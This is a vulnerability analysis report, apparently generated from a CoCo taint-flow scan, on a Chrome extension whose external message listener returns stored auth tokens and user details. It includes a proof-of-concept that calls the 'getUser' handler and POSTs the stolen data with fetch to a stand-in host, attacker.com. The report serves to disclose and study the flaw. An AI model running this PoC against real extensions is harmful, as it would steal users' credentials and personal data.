# CoCo Analysis: mncmefhlcbommcgkfkgmgcgfgkknjpgo

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (all same vulnerability pattern)

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mncmefhlcbommcgkfkgmgcgfgkknjpgo/opgen_generated_files/bg.js
Line 751: `var storage_local_get_source = {'key': 'value'};`
Line 965: Extension code containing chrome.runtime.onMessageExternal.addListener

**Code:**

```javascript
// Background script (bg.js) - Line 965 (actual extension code)
// Message handler class
var m = function(){
    function n(){}
    return n.prototype.handle=function(n){
        chrome.storage.local.get(["token","email","firstName","lastName","companyName"],(function(t){
            t.token?n(t):n(null)  // ← storage data retrieved and passed to callback
        }))
    },n
}();

// Service class that uses the handler
var y = function(){
    function n(){}
    return n.prototype.serve=function(n,t){
        (new m).handle(t)  // ← t is sendResponse callback, receives storage data
    },n
}();

// Command routing
var g = {
    signIn:function(){return new l},
    signOut:function(){return new p},
    getUser:function(){return new y},  // ← "getUser" command returns handler with vulnerability
    getConfig:function(){return new d}
};

// Message listeners - Entry point for external attacker
chrome.runtime.onMessage.addListener((function(n,t,e){
    return console.log(n.message+" is triggered."),
    w.get(n.message).serve(n,e),  // ← n.message controls which handler is called, e is sendResponse
    !0
}));

chrome.runtime.onMessageExternal.addListener((function(n,t,e){  // ← EXTERNAL MESSAGE LISTENER
    return console.log("External "+n.message+" is triggered."),
    w.get(n.message).serve(n,e),  // ← e is sendResponse callback passed to handler
    !0  // ← attacker-controlled data flows to sendResponse
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any extension or whitelisted website (*.tentrucks.com/*, relay.amazon.com/*)
chrome.runtime.sendMessage(
    "mncmefhlcbommcgkfkgmgcgfgkknjpgo",  // Extension ID
    {message: "getUser"},  // Trigger getUser handler
    function(response) {
        // response contains: {token, email, firstName, lastName, companyName}
        console.log("Stolen credentials:", response);
        // Exfiltrate to attacker server
        fetch("https://attacker.com/steal", {
            method: "POST",
            body: JSON.stringify(response)
        });
    }
);
```

**Impact:** Information disclosure vulnerability. External attackers (from whitelisted domains *.tentrucks.com/* or relay.amazon.com/*) can retrieve sensitive user data from extension storage including authentication tokens, email, and personal information. While manifest.json has externally_connectable restrictions, per analysis methodology Rule #1, we ignore these restrictions. The presence of chrome.runtime.onMessageExternal with accessible handlers means ANY whitelisted website can exploit this. This is a complete storage exploitation chain: external trigger → storage.get → sendResponse to attacker.
